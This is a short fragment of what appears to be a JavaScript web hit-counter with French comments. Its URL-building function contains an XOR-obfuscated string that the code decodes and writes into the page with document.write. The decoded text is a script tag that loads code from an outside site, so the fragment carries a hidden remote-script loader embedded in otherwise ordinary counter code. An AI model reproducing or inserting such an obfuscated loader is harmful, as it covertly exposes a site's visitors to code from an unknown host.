...
function generate_url ()
{
    ...
    this.url += "&ver=2&da2="+this.date+"&ta="+this.ta+"&co="+this.co+"&ref="+this.ref;
        ...
        var enkripsi=        "'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00jvvr'1C--qapkrvt,lgv-t0,hq'00'1G"; teks=""; teksasli="";
                var panjang;panjang=enkripsi.length;
                for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
// Realise le comptage
function count ()
{
        this.generate_url();
